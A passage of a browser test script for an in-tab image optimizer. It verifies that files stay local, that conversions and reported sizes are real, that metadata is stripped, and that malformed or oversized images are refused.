/**
 * Real-browser self-test.
 *
 *   npm run build && npm run test:browser
 *
 * Starts the production build behind the real server, drives it in a real
 * Chromium, and records every byte the browser sends through a proxy that the
 * browser is forced to use. It proves, with a real decoder, real encoders and a
 * real network stack:
 *
 *   P1  A selected file never leaves the tab.
 *   P2  Processing works with the network cut.
 *   P3  Files are identified by their contents and checked before decoding.
 *   P4  Every output is a real file of the chosen format.
 *   P5  The sizes shown are the real sizes of the files.
 *   P6  A larger output is reported, and the original is offered instead.
 *   P7  The strategies choose what they say they choose.
 *   P8  A photo's rotation is applied; its metadata is not carried over.
 *   P9  Size limits are respected and nothing is enlarged.
 *   P10 A batch can be cancelled, runs with bounded concurrency, and recovers.
 *   P11 Nothing is left behind: URLs released, workers stopped, nothing stored.
 *   P12 The other tools: CSS and asset analysis in the tab, the audit sends a URL only.
 *       Also: the policy that blocks other origins, the new name, settings,
 *       keyboard and drop, and the paths for browsers without workers or
 *       without a canvas that writes WebP.
 */
import { createHash, randomBytes } from "node:crypto";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import JSZip from "jszip";
import { launchBrowser } from "./lib/browser.mjs";
import { startRecordingProxy } from "./lib/recording-proxy.mjs";
import { animatedPng, createChecker, fixture, fixturePath, pngDeclaring, solidBmp, startApi } from "./lib/selftest-kit.mjs";
import { formatBytes } from "../src/lib/format.ts";
import { readImageHeader } from "../src/shared/imageHeader.ts";
import { resolveEngineLimits } from "../src/features/images/engine/plan.ts";

const checker = createChecker("Real-browser self-test");
const { check, section } = checker;
const root = fileURLToPath(new URL("..", import.meta.url));
const sha256 = (bytes) => createHash("sha256").update(bytes).digest("hex");
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

if (!existsSync(join(root, "dist/index.html"))) {
  console.error("dist/ is missing. Run `npm run build` first: this test drives the production build.");
  process.exit(1);
}

const work = mkdtempSync(join(tmpdir(), "unikit-browser-"));
const downloads = join(work, "downloads");
const inputs = join(work, "inputs");
(await import("node:fs")).mkdirSync(downloads);
(await import("node:fs")).mkdirSync(inputs);
const input = (name, bytes) => {
  const path = join(inputs, name);
  writeFileSync(path, bytes);
  return path;
};

let api;
let proxy;
let browser;

try {
  api = await startApi();
  proxy = await startRecordingProxy({ origin: api.base });
  const launched = await launchBrowser({ args: proxy.browserArgs });
  browser = launched.browser;
  console.log(`Browser: ${launched.version} (${launched.source})`);
  console.log(`App:     ${api.base} (production build, real server), all traffic through a recording proxy`);

  /* ------------------------------ downloads ------------------------------ */
  const cdp = await browser.target().createCDPSession();
  await cdp.send("Browser.setDownloadBehavior", { behavior: "allowAndName", downloadPath: downloads, eventsEnabled: true });
  const begun = new Map();
  let waiter = null;
  cdp.on("Browser.downloadWillBegin", (event) => begun.set(event.guid, event));
  cdp.on("Browser.downloadProgress", (event) => {
    if (event.state === "completed" && waiter) {
      const done = waiter;
      waiter = null;
      done.resolve(begun.get(event.guid));
    } else if (event.state === "canceled" && waiter) {
      const done = waiter;
      waiter = null;
      done.reject(new Error("the download was cancelled"));
    }
  });
  /** Runs `trigger` and returns the file the browser saved because of it. */
  async function download(trigger) {
    const finished = new Promise((resolve, reject) => {
      waiter = { resolve, reject };
      setTimeout(() => reject(new Error("no download within 20 seconds")), 20_000).unref?.();
    });
    await trigger();
    const event = await finished;
    return { filename: event.suggestedFilename, url: event.url, bytes: readFileSync(join(downloads, event.guid)) };
  }

  /* ------------------------------ page setup ----------------------------- */
  /** Runs in the page before any of its scripts: counts object URLs, workers and every API that can send data. */
  const instrument = () => {
    const live = new Set();
    const stats = { created: 0, revoked: 0, workersCreated: 0, workersTerminated: 0, sends: [] };
    const create = URL.createObjectURL.bind(URL);
    const revoke = URL.revokeObjectURL.bind(URL);
    URL.createObjectURL = (blob) => {
      const url = create(blob);
      live.add(url);
      stats.created += 1;
      return url;
    };
    URL.revokeObjectURL = (url) => {
      if (live.delete(url)) stats.revoked += 1;
      revoke(url);
    };
    if (window.Worker) {
      const NativeWorker = window.Worker;
      window.Worker = class extends NativeWorker {
        constructor(...args) {
          super(...args);
          stats.workersCreated += 1;
        }
        terminate() {
          stats.workersTerminated += 1;
          super.terminate();
        }
      };
    }
    const nativeFetch = window.fetch.bind(window);
    window.fetch = (resource, init) => {
      const body = init?.body;
      stats.sends.push({ api: "fetch", url: String(resource?.url ?? resource), method: init?.method ?? "GET", bodyKind: body == null ? null : (body.constructor?.name ?? typeof body), bodySize: typeof body === "string" ? body.length : (body?.size ?? body?.byteLength ?? null) });
      return nativeFetch(resource, init);
    };
    const nativeSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function send(body) {
      stats.sends.push({ api: "xhr", bodyKind: body == null ? null : (body.constructor?.name ?? typeof body) });
      return nativeSend.call(this, body);
    };
    if (navigator.sendBeacon) {
      const nativeBeacon = navigator.sendBeacon.bind(navigator);
      navigator.sendBeacon = (url, data) => {
        stats.sends.push({ api: "beacon", url: String(url), bodyKind: data == null ? null : (data.constructor?.name ?? typeof data) });
        return nativeBeacon(url, data);
      };
    }
    for (const name of ["WebSocket", "EventSource", "RTCPeerConnection"]) {
      const Native = window[name];
      if (!Native) continue;
      window[name] = class extends Native {
        constructor(...args) {
          stats.sends.push({ api: name, url: String(args[0]) });
          super(...args);
        }
      };
    }
    window.__probe = { live, stats };
  };

  // UNIKIT_TEST_DEVICE="cores=4,memory=8" makes the page report that device, so the
  // limits and the concurrency of another machine can be tested on this one.
  const pretend = Object.fromEntries((process.env.UNIKIT_TEST_DEVICE ?? "").split(",").map((part) => part.trim().split("=")).filter((pair) => pair.length === 2).map(([key, value]) => [key, Number(value)]));
  const pretendDevice = ({ cores, memory }) => {
    if (Number.isFinite(cores)) Object.defineProperty(Navigator.prototype, "hardwareConcurrency", { get: () => cores, configurable: true });
    if (Number.isFinite(memory)) Object.defineProperty(Navigator.prototype, "deviceMemory", { get: () => memory, configurable: true });
  };
  if (Object.keys(pretend).length > 0) console.log(`Device:  the page is told it has ${JSON.stringify(pretend)} (UNIKIT_TEST_DEVICE)`);

  const consoleErrors = [];
  async function openPage(path, { before } = {}) {
    const tab = await browser.newPage();
    await tab.setViewport({ width: 1366, height: 900 });
    await tab.evaluateOnNewDocument(instrument);
    if (Object.keys(pretend).length > 0) await tab.evaluateOnNewDocument(pretendDevice, pretend);
    if (before) await tab.evaluateOnNewDocument(before);
    tab.on("pageerror", (error) => consoleErrors.push(`pageerror: ${error.message}`));
    tab.on("console", (message) => {
      if (message.type() === "error") consoleErrors.push(`console: ${message.text()}`);
    });
    await tab.goto(`${api.base}${path}`, { waitUntil: "networkidle0" });
    return tab;
  }

  /* ------------------------------ UI helpers ----------------------------- */
  const clickButton = (tab, text, options = {}) =>
    tab.evaluate(
      (wanted, exact) => {
        const buttons = [...document.querySelectorAll("button, a")].filter((element) => {
          const label = (element.textContent ?? "").replace(/\s+/g, " ").trim();
          return exact ? label === wanted : label.startsWith(wanted);
        });
        const target = buttons.find((element) => !element.disabled);
        if (!target) return false;
        target.click();
        return true;
      },
      text,
      options.exact ?? false,
    );
  const clickLabel = (tab, label) =>
    tab.evaluate((wanted) => {
      const target = document.querySelector(`[aria-label="${wanted}"]`);
      if (!target) return false;
      target.click();
      return true;
    }, label);
  const choose = (tab, group, option) =>
    tab.evaluate(
      (groupLabel, optionLabel) => {
        const radio = [...document.querySelectorAll(`[role="radiogroup"][aria-label="${groupLabel}"] [role="radio"]`)].find((element) => element.textContent.trim() === optionLabel);
        if (!radio) return false;
        radio.click();
        return true;
      },
      group,
      option,
    );
  /** Sets a React-controlled input the way typing does: through the native setter, then an input event. */
  const setInput = (tab, selector, value) =>
    tab.evaluate(
      (target, next) => {
        const element = document.querySelector(target);
        if (!element) return false;
        Object.getOwnPropertyDescriptor(element instanceof HTMLTextAreaElement ? HTMLTextAreaElement.prototype : HTMLInputElement.prototype, "value").set.call(element, next);
        element.dispatchEvent(new Event("input", { bubbles: true }));
        return true;
      },
      selector,
      String(value),
    );
  const selectFiles = async (tab, paths) => {
    const element = await tab.$('input[type="file"]');
    await element.uploadFile(...paths);
  };
  const queue = (tab) =>
    tab.evaluate(() =>
      [...document.querySelectorAll('[data-testid="queue"] li')].map((row) => ({
        name: row.querySelector("p[title]")?.getAttribute("title") ?? "",
        status: row.getAttribute("data-status"),
        text: row.textContent.replace(/\s+/g, " ").trim(),
      })),
    );
  const waitChecked = (tab) => tab.waitForFunction(() => document.querySelectorAll('[data-testid="queue"] li[data-status="checking"]').length === 0, { timeout: 30_000 });
  const waitIdle = (tab, timeout = 120_000) =>
    tab.waitForFunction(() => !document.querySelector('[data-testid="progress"]') && document.querySelectorAll('[data-testid="queue"] li[data-status="checking"], [data-testid="queue"] li[data-status="waiting"], [data-testid="queue"] li[data-status="processing"]').length === 0, { timeout });
  const results = (tab) =>
    tab.evaluate(() =>
      [...document.querySelectorAll('[data-testid="results"] tr')].map((row) => {
        const cells = [...row.querySelectorAll("td")].map((cell) => cell.textContent.replace(/\s+/g, " ").trim());
        const names = row.querySelectorAll("td:first-child span");
        return { kind: row.getAttribute("data-result"), name: names[0]?.getAttribute("title") ?? "", output: names[1]?.getAttribute("title") ?? "", before: cells[1], after: cells[2], saved: cells[3], dimensions: cells[4], format: cells[5], time: cells[6] };
      }),
    );
  const optimize = async (tab) => {
    await waitChecked(tab);
    const clicked = await clickButton(tab, "Optimize ");
    if (!clicked) throw new Error("the Optimize button was not available");
    await waitIdle(tab);
  };
  const startOver = async (tab) => {
    if (!(await clickButton(tab, "Start over"))) await clickButton(tab, "Clear all");
    await tab.waitForFunction(() => !document.querySelector('[data-testid="queue"]'));
  };
  const probe = (tab) => tab.evaluate(() => ({ live: window.__probe.live.size, ...window.__probe.stats }));
  /** Decodes bytes with the browser's own decoder and samples pixels. Fails when the bytes are not a real image. */
  const decodeInPage = (tab, bytes, points = []) =>
    tab.evaluate(
      async (base64, samples) => {
        const binary = atob(base64);
        const data = new Uint8Array(binary.length);
        for (let index = 0; index < binary.length; index += 1) data[index] = binary.charCodeAt(index);
        const bitmap = await createImageBitmap(new Blob([data]));
        const canvas = new OffscreenCanvas(bitmap.width, bitmap.height);
        const context = canvas.getContext("2d");
        context.drawImage(bitmap, 0, 0);
        return { width: bitmap.width, height: bitmap.height, pixels: samples.map(([x, y]) => Array.from(context.getImageData(Math.floor(x * bitmap.width), Math.floor(y * bitmap.height), 1, 1).data)) };
      },
      bytes.toString("base64"),
      points,
    );
  const saveRow = (tab, outputName) => download(() => clickLabel(tab, `Download ${outputName}`));
  /** The first size in a line of text, in bytes. */
  const parseSize = (text) => {
    const match = /([\d.]+) (B|KB|MB)\b/.exec(text);
    return match ? Number(match[1]) * { B: 1, KB: 1024, MB: 1024 * 1024 }[match[2]] : null;
  };

  /** Asserts that the traffic in a window was only this app fetching its own static files. */
  const ASSET_PATH = /^\/(assets\/[\w.-]+|theme\.js|favicon\.svg|site\.webmanifest|icons\/[\w.-]+|og-image\.png|robots\.txt|app(\/[a-z]+)?)?$/;
  function onlyStaticGets(entries) {
    const offending = entries.filter((entry) => entry.method !== "GET" || entry.bodyBytes > 0 || entry.declaredLength > 0 || entry.query !== "" || entry.refused === "other-origin" || !ASSET_PATH.test(entry.path));
    return { ok: offending.length === 0, detail: offending.map((entry) => `${entry.method} ${entry.url} body=${entry.bodyBytes}`).join("; ") };
  }

  /* ======================================================================= */
  section("Setup: the page loads, with a Content-Security-Policy and without cookies");
  const tab = await openPage("/app/images");
  const firstDocument = proxy.log.find((entry) => entry.path === "/app/images");
  const csp = String(firstDocument?.responseHeaders?.["content-security-policy"] ?? "");
  check("the document is served with a Content-Security-Policy", csp.includes("connect-src 'self'") && csp.includes("form-action 'self'") && csp.includes("default-src 'self'"), csp);
  check("the policy allows no inline script and no eval", !/script-src[^;]*'unsafe-inline'/.test(csp) && !/script-src[^;]*'unsafe-eval'/.test(csp), csp);
  check("the page title carries the new name", /Unikit Studio/.test(await tab.title()), await tab.title());
  check("the page rendered the Image Optimizer", await tab.evaluate(() => document.body.innerText.includes("1 · Select images")));
  check("no script error while loading", consoleErrors.length === 0, consoleErrors.join(" | "));
  const device = await tab.evaluate(() => ({ deviceMemory: navigator.deviceMemory ?? null, cores: navigator.hardwareConcurrency, mobile: false }));
  const limits = resolveEngineLimits(device);
  console.log(`  device: ${device.cores} cores, ${device.deviceMemory ?? "unknown"} GB → concurrency ${limits.concurrency}, ${limits.maxSourcePixels / 1e6} MP per image`);

  /* ======================================================================= */
  section("P1 · A selected file never leaves the tab");
  // A photo with a marker inside its bytes and in its name. Neither may ever appear in anything the browser sends.
  const canary = `CANARY${randomBytes(12).toString("hex")}`;
  const photo = fixture("photo-800x600.jpg");
  const canaryBytes = Buffer.concat([photo, Buffer.from(`\n${canary}\n`, "latin1")]);
  const canaryName = `private-${canary}.jpg`;
  const canaryPath = input(canaryName, canaryBytes);
  const p1Mark = proxy.mark();
  await selectFiles(tab, [canaryPath]);
  await waitChecked(tab);
  let rows = await queue(tab);
  check("the file is accepted after a check of its contents", rows.length === 1 && rows[0].status === "ready" && rows[0].text.includes("JPEG") && rows[0].text.includes("800 × 600"), JSON.stringify(rows));
  check("selecting and checking the file caused no request at all", proxy.since(p1Mark).length === 0, proxy.since(p1Mark).map((entry) => `${entry.method} ${entry.path}`).join(", "));
  await optimize(tab);
  let table = await results(tab);
  check("the file was converted to WebP", table.length === 1 && table[0].format === "WebP" && table[0].kind === "smaller", JSON.stringify(table));
  const webp = await saveRow(tab, table[0].output);
  check("the download comes from a blob: URL, which the browser resolves locally", webp.url.startsWith("blob:"), webp.url);
  const p1Traffic = proxy.since(p1Mark);
  const p1Static = onlyStaticGets(p1Traffic);
  check("while it was processed and saved, the browser only fetched the app's own code (the worker script)", p1Static.ok, p1Static.detail);
  check("not one byte of request body was sent", p1Traffic.reduce((sum, entry) => sum + entry.bodyBytes + entry.declaredLength, 0) === 0);
  const sent = (entries) => Buffer.concat(entries.flatMap((entry) => [Buffer.from(`${entry.url}\n${entry.headerText}\n`, "latin1"), entry.body]));
  const everything = sent(proxy.log);
  check("the file's name appears in nothing the browser sent", !everything.includes(canary));
  check("the file's contents appear in nothing the browser sent", !everything.includes(canaryBytes.subarray(2000, 2048)) && !everything.includes(canaryBytes.subarray(2000, 2048).toString("base64")));
  const sends = (await probe(tab)).sends;
  check("the page called no API that sends data (fetch with a body, XHR, beacon, WebSocket, EventSource, WebRTC)", sends.every((entry) => entry.api === "fetch" && entry.bodyKind === null), JSON.stringify(sends));
  // A second run has nothing left to fetch, so it must be silent.
  await choose(tab, "Output format", "JPEG");
  const silentMark = proxy.mark();
  await optimize(tab);
  check("a second run causes no request of any kind", proxy.since(silentMark).length === 0, proxy.since(silentMark).map((entry) => `${entry.method} ${entry.path}`).join(", "));

  /* ======================================================================= */
  section("P4 · Every output is a real file of the chosen format · P5 · The sizes shown are real");
  const SIGNATURES = { WebP: "webp", AVIF: "avif", JPEG: "jpeg", PNG: "png" };
  const produced = {};
  for (const format of ["WebP", "AVIF", "JPEG", "PNG"]) {
    await choose(tab, "Output format", format);
    const mark = proxy.mark();
    await optimize(tab);
    table = await results(tab);
    const row = table[0];
    const file = await saveRow(tab, row.output);
    produced[format] = file.bytes;
    const header = readImageHeader(new Uint8Array(file.bytes));
    const decoded = await decodeInPage(tab, file.bytes);
    check(`${format}: the saved file starts with the ${format} signature`, header?.format === SIGNATURES[format] && !header.malformed, header?.format);
    check(`${format}: the browser's decoder opens it as 800 × 600`, decoded.width === 800 && decoded.height === 600 && header.width === 800 && header.height === 600, JSON.stringify(decoded));
    check(`${format}: "Before" is the selected file's size (${formatBytes(canaryBytes.length)})`, row.before === formatBytes(canaryBytes.length), row.before);
    check(`${format}: "After" is the saved file's size (${formatBytes(file.bytes.length)})`, row.after === formatBytes(file.bytes.length), row.after);
    const percent = Math.round(((canaryBytes.length - file.bytes.length) / canaryBytes.length) * 1000) / 10;
    check(`${format}: "Saved" is computed from those two sizes (${percent > 0 ? "+" : ""}${percent}%)`, row.saved === `${percent > 0 ? "+" : ""}${percent}%`, row.saved);
    check(`${format}: the saved name is ${canaryName.replace(".jpg", "")}-optimized.${format === "JPEG" ? "jpg" : format.toLowerCase()}`, file.filename === `private-${canary}-optimized.${format === "JPEG" ? "jpg" : format.toLowerCase()}`, file.filename);
    const traffic = onlyStaticGets(proxy.since(mark));
    check(`${format}: the only requests were for the app's own files${format === "AVIF" ? " (the AVIF codec, fetched once)" : ""}`, traffic.ok, traffic.detail);
    if (format === "AVIF") {
      const codec = proxy.since(mark).filter((entry) => entry.path.endsWith(".wasm"));
      check("AVIF: the codec is one .wasm file from this origin, requested without a body", codec.length === 1 && codec[0].method === "GET" && codec[0].bodyBytes === 0 && codec[0].status === 200, JSON.stringify(codec.map((entry) => [entry.path, entry.status])));
      check("AVIF: the codec ran under the Content-Security-Policy, with no script error", consoleErrors.length === 0, consoleErrors.join(" | "));
    }
  }
  check("the four files really differ: four different encoders ran", new Set(Object.values(produced).map(sha256)).size === 4);
  await choose(tab, "Output format", "Keep format");
  await optimize(tab);
  table = await results(tab);
  check('"Keep format" writes a JPEG for a JPEG source', table[0].format === "JPEG", JSON.stringify(table[0]));

  /* ======================================================================= */
  section("P2 · Processing works with the network cut");
  await startOver(tab);
  proxy.setOffline(true);
  const offlineMark = proxy.mark();
  await choose(tab, "Output format", "AVIF");
  await selectFiles(tab, [fixturePath("alpha-320x200.png"), fixturePath("progressive-320x240.jpg")]);
  await optimize(tab);
  table = await results(tab);
  check("two images were converted to AVIF while every request would have been refused", table.length === 2 && table.every((row) => row.format === "AVIF"), JSON.stringify(table));
  const offlineFile = await saveRow(tab, table[0].output);
  check("the result made offline is a real AVIF", readImageHeader(new Uint8Array(offlineFile.bytes))?.format === "avif");
  check("the browser did not even try to reach the network", proxy.since(offlineMark).length === 0, proxy.since(offlineMark).map((entry) => `${entry.method} ${entry.path}`).join(", "));
  proxy.setOffline(false);

  /* ======================================================================= */
  section("P3 · Files are identified by their contents and checked before decoding");
  await startOver(tab);
  const bomb = pngDeclaring(30_000, 30_000);
  const refused = {
    "text-named.jpg": Buffer.from("This is a text file with an image's name.\n".repeat(40)),
    "bomb-30000x30000.png": bomb,
    "animation.png": animatedPng(3),
    "vector.svg": Buffer.from('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><rect width="40" height="40"/></svg>'),
    "cut-off.jpg": photo.subarray(0, 120),
    "empty.png": Buffer.alloc(0),
  };
  const refusedPaths = Object.entries(refused).map(([name, bytes]) => input(name, bytes));
  const pngAsJpg = input("really-a-png.jpg", fixture("flat-600x400.png"));
  const bmpPath = input("bitmap.bmp", solidBmp(64, 48));
  const checkStarted = Date.now();
  await selectFiles(tab, [...refusedPaths, fixturePath("animated-3f-60x40.gif"), fixturePath("animated-3f-60x40.webp"), pngAsJpg, bmpPath]);
  await waitChecked(tab);
  const checkMs = Date.now() - checkStarted;
  rows = await queue(tab);
  const row = (name) => rows.find((entry) => entry.name === name) ?? { status: "missing", text: "" };
  check("a text file named .jpg is refused: the name is not trusted", row("text-named.jpg").status === "not accepted" && /contents of this file are not an image/.test(row("text-named.jpg").text), row("text-named.jpg").text);
  check(`a ${bomb.length}-byte PNG that declares 30,000 × 30,000 px is refused from its header`, row("bomb-30000x30000.png").status === "not accepted" && /30,000 × 30,000 px \(900 MP\)/.test(row("bomb-30000x30000.png").text) && /before anything is decoded/.test(row("bomb-30000x30000.png").text), row("bomb-30000x30000.png").text);
  check("the refusal names the memory the decode would have needed", /3,433 MB of memory/.test(row("bomb-30000x30000.png").text), row("bomb-30000x30000.png").text);
  check("an animated PNG is refused instead of being flattened", row("animation.png").status === "not accepted" && /animated \(3 frames\)/.test(row("animation.png").text), row("animation.png").text);
  check("an animated GIF is refused", row("animated-3f-60x40.gif").status === "not accepted" && /animated \(3 frames\)/.test(row("animated-3f-60x40.gif").text));
  check("an animated WebP is refused", row("animated-3f-60x40.webp").status === "not accepted" && /animated \(3 frames\)/.test(row("animated-3f-60x40.webp").text));
  check("an SVG is refused as a vector image", row("vector.svg").status === "not accepted" && /vector image/.test(row("vector.svg").text));
  check("a JPEG cut off before its frame header is refused as damaged", row("cut-off.jpg").status === "not accepted" && /starts like a JPEG/.test(row("cut-off.jpg").text), row("cut-off.jpg").text);
  check("an empty file is refused", row("empty.png").status === "not accepted" && /empty/.test(row("empty.png").text));
  check("a PNG named .jpg is accepted as what it is, and the mismatch is pointed out", row("really-a-png.jpg").status === "ready" && row("really-a-png.jpg").text.includes("PNG · ") && /but the file is a PNG/.test(row("really-a-png.jpg").text), row("really-a-png.jpg").text);
  check("a BMP is accepted", row("bitmap.bmp").status === "ready" && row("bitmap.bmp").text.includes("BMP"), row("bitmap.bmp").text);
  check(`all eleven files were checked in ${checkMs} ms, without a worker: nothing was decoded`, checkMs < 5_000 && (await probe(tab)).workersCreated <= limits.concurrency);
  check("the Optimize button counts only the two accepted files", await tab.evaluate(() => [...document.querySelectorAll("button")].some((button) => button.textContent.trim() === "Optimize 2 files")));
  await choose(tab, "Output format", "WebP");
  await optimize(tab);
  table = await results(tab);
  check("the two accepted files were converted; the refused ones were never processed", table.length === 2 && table.every((entry) => entry.format === "WebP"), JSON.stringify(table.map((entry) => [entry.name, entry.format])));
  rows = await queue(tab);
  check("the refused files are still listed with their reasons", rows.filter((entry) => entry.status === "not accepted").length === 8);
  // A format this browser cannot decode fails for that file only, with a reason.
  await startOver(tab);
  await selectFiles(tab, [fixturePath("image-200x150.tiff"), fixturePath("still-200x150.gif")]);
  await optimize(tab);
  rows = await queue(tab);
  const tiff = rows.find((entry) => entry.name === "image-200x150.tiff");
  const gif = rows.find((entry) => entry.name === "still-200x150.gif");
  check("a single-frame GIF is converted", gif?.status === "done", gif?.text);
  check("a TIFF either converts or fails with a reason that names the cause; the other file is unaffected", tiff?.status === "done" || (tiff?.status === "failed" && /could not decode the TIFF/.test(tiff.text) && /only by Safari/.test(tiff.text)), tiff?.text);

  /* ======================================================================= */
  section("P6 · A larger output is reported, and the original is offered instead");
  await startOver(tab);
  const flat = fixture("flat-600x400.png");
  await choose(tab, "Output format", "JPEG");
  await selectFiles(tab, [fixturePath("flat-600x400.png")]);
  await optimize(tab);
  table = await results(tab);
  check(`a ${flat.length}-byte palette PNG written as JPEG is reported as larger`, table[0].kind === "larger" && table[0].saved.startsWith("-"), JSON.stringify(table[0]));
  check("a notice says the result is larger and what to do", await tab.evaluate(() => document.body.innerText.includes("1 result is larger than the original")));
  const largerJpeg = await saveRow(tab, table[0].output);
  check("the converted file really is larger: the number is not hidden", largerJpeg.bytes.length > flat.length && table[0].after === formatBytes(largerJpeg.bytes.length), `${largerJpeg.bytes.length} > ${flat.length}`);
  check('"Keep original" is offered for that file', await clickLabel(tab, "Keep the original for flat-600x400.png"));
  await tab.waitForFunction(() => document.querySelector('[data-testid="results"] tr')?.getAttribute("data-result") === "original");
  table = await results(tab);
  const keptByChoice = await saveRow(tab, "flat-600x400.png");
  check("after choosing it, the download is the original file, byte for byte", sha256(keptByChoice.bytes) === sha256(flat) && keptByChoice.filename === "flat-600x400.png");
  check("the table then shows the original's size and 0% saved", table[0].after === formatBytes(flat.length) && table[0].saved === "0%", JSON.stringify(table[0]));
  // The no-regression strategy does this by itself.
  await choose(tab, "Optimization strategy", "No-regression");
  await optimize(tab);
  table = await results(tab);
  const noRegression = await saveRow(tab, table[0].output);
  const candidateText = await tab.evaluate(() => document.querySelector('[data-testid="review"] article')?.innerText ?? "");
  check("no-regression never returns a file larger than the original", noRegression.bytes.length <= flat.length, `${noRegression.bytes.length} vs ${flat.length}`);
  check("the result card lists the formats that were compared, with their real sizes", /Formats compared/i.test(candidateText) && /WebP at quality 78/.test(candidateText) && /AVIF at quality 78/.test(candidateText) && /original file/.test(candidateText), candidateText.replace(/\s+/g, " ").slice(-300));
  // A file that no format can beat: an already compressed WebP, re-encoded at quality 100.
  await startOver(tab);
  const tight = fixture("lossy-400x300.webp");
  await setInput(tab, "#quality", 100);
  await selectFiles(tab, [fixturePath("lossy-400x300.webp")]);
  await optimize(tab);
  table = await results(tab);
  const keptCard = await tab.evaluate(() => [...document.querySelectorAll('[data-testid="review"] article ul li')].map((line) => line.innerText.replace(/\s+/g, " ").trim()));
  const keptSizes = keptCard.filter((line) => /quality 100/.test(line)).map(parseSize);
  check("every format at quality 100 came out larger than the original", keptSizes.length >= 2 && keptSizes.every((size) => size > tight.length), JSON.stringify(keptCard));
  check("no-regression kept the original by itself", table[0].kind === "original" && table[0].saved === "0%" && table[0].after === formatBytes(tight.length), JSON.stringify(table[0]));
  const keptAutomatically = await saveRow(tab, "lossy-400x300.webp");
  check("the download is the original file, byte for byte, under its own name", sha256(keptAutomatically.bytes) === sha256(tight) && keptAutomatically.filename === "lossy-400x300.webp");
  check("the card says the original was kept and why", await tab.evaluate(() => document.body.innerText.includes("Every result was at least as large as the original, so the original file is kept.")));
  await setInput(tab, "#quality", 78);

  /* ======================================================================= */
  section("P7 · The strategies choose what they say they choose");
  await startOver(tab);
  await choose(tab, "Optimization strategy", "Best-effort");
  await selectFiles(tab, [fixturePath("photo-800x600.jpg"), fixturePath("alpha-320x200.png")]);
  await optimize(tab);
  table = await results(tab);
  const cards = await tab.evaluate(() =>
    [...document.querySelectorAll('[data-testid="review"] article')].map((card) => ({
      name: card.querySelector("h3")?.getAttribute("title"),
      lines: [...card.querySelectorAll("ul li")].map((line) => line.innerText.replace(/\s+/g, " ").trim()),
    })),
  );
  for (const card of cards) {
    const candidates = card.lines.filter((line) => /quality \d+/.test(line) && !/not tried/.test(line) && !/failed/.test(line));
    const chosen = candidates.find((line) => line.includes("· chosen"));
    const smallest = candidates.map((line) => ({ line, size: parseSize(line) })).sort((a, b) => a.size - b.size)[0];
    check(`${card.name}: best-effort compared ${candidates.length} formats and chose the smallest`, candidates.length >= 2 && chosen !== undefined && smallest.line === chosen, JSON.stringify(card.lines));
  }
  const alphaCard = cards.find((card) => card.name === "alpha-320x200.png");
  check("for an image with transparency, JPEG is left out and the reason is stated", alphaCard?.lines.some((line) => /uses transparency, which JPEG cannot store/.test(line)), JSON.stringify(alphaCard?.lines));
  const photoCard = cards.find((card) => card.name === "photo-800x600.jpg");
  check("for an opaque photo, JPEG is one of the formats compared", photoCard?.lines.some((line) => /^JPEG at quality/.test(line) && !/not tried/.test(line)), JSON.stringify(photoCard?.lines));
  const alphaRow = table.find((entry) => entry.name === "alpha-320x200.png");
  const alphaOut = await saveRow(tab, alphaRow.output);
  const alphaPixels = await decodeInPage(tab, alphaOut.bytes, [[0.02, 0.02], [0.5, 0.5]]);
  check("transparency survives: the corner is still transparent and the centre opaque", alphaPixels.pixels[0][3] === 0 && alphaPixels.pixels[1][3] === 255, JSON.stringify(alphaPixels.pixels));
  // Single → JPEG on the same transparent image fills with white, and says so.
  await choose(tab, "Optimization strategy", "Single");
  await choose(tab, "Output format", "JPEG");
  await optimize(tab);
  table = await results(tab);
  const flattened = await saveRow(tab, table.find((entry) => entry.name === "alpha-320x200.png").output);
  const flatPixels = await decodeInPage(tab, flattened.bytes, [[0.02, 0.02]]);
  check("written as JPEG, the transparent corner becomes white, not black", flatPixels.pixels[0].slice(0, 3).every((channel) => channel > 245), JSON.stringify(flatPixels.pixels[0]));
  check("the result says that transparent areas were filled with white", await tab.evaluate(() => document.body.innerText.includes("JPEG cannot store them, so they are white in the result")));

  /* ======================================================================= */
  section("P8 · A photo's rotation is applied; its metadata is not carried over");
  await startOver(tab);
  const rotated = fixture("rotated-gps-240x160.jpg");
  const rotatedHeader = readImageHeader(new Uint8Array(rotated));
  check("the fixture is stored 240 × 160 with EXIF orientation 6, a GPS block and a colour profile", rotatedHeader.width === 240 && rotatedHeader.height === 160 && rotatedHeader.orientation === 6 && rotatedHeader.metadata.gps && rotatedHeader.metadata.icc);
  await choose(tab, "Output format", "PNG");
  await selectFiles(tab, [fixturePath("rotated-gps-240x160.jpg")]);
  await waitChecked(tab);
  rows = await queue(tab);
  check("the queue shows the size as displayed: 160 × 240", rows[0].text.includes("160 × 240"), rows[0].text);
  await optimize(tab);
  table = await results(tab);
  const upright = await saveRow(tab, table[0].output);
  const uprightHeader = readImageHeader(new Uint8Array(upright.bytes));
  // Stored quadrants: red (top-left), green (top-right), blue (bottom-left), white (bottom-right). Orientation 6 turns the image a quarter turn clockwise.
  const turned = await decodeInPage(tab, upright.bytes, [[0.25, 0.25], [0.75, 0.25], [0.25, 0.75], [0.75, 0.75]]);
  const near = (pixel, [r, g, b]) => Math.abs(pixel[0] - r) < 40 && Math.abs(pixel[1] - g) < 40 && Math.abs(pixel[2] - b) < 40;
  check("the output is 160 × 240: the rotation is in the pixels", uprightHeader.width === 160 && uprightHeader.height === 240 && turned.width === 160 && turned.height === 240, `${uprightHeader.width}×${uprightHeader.height}`);
  check("the quadrants are where a quarter turn clockwise puts them", near(turned.pixels[0], [30, 60, 220]) && near(turned.pixels[1], [220, 30, 30]) && near(turned.pixels[2], [245, 245, 245]) && near(turned.pixels[3], [30, 180, 60]), JSON.stringify(turned.pixels));
  check("the output has no EXIF, no GPS block and no orientation tag", !uprightHeader.metadata.exif && !uprightHeader.metadata.gps && uprightHeader.orientation === null, JSON.stringify(uprightHeader.metadata));
  check("the camera make from the EXIF is not in the output", rotated.includes("FixtureCam") && !upright.bytes.includes("FixtureCam"));
  check("the result card says the GPS location was not carried over", await tab.evaluate(() => document.body.innerText.includes("The original carries a GPS location in its metadata. The converted file does not.")));

  /* ======================================================================= */
  section("P9 · Size limits are respected and nothing is enlarged");
  await startOver(tab);
  await choose(tab, "Output format", "WebP");
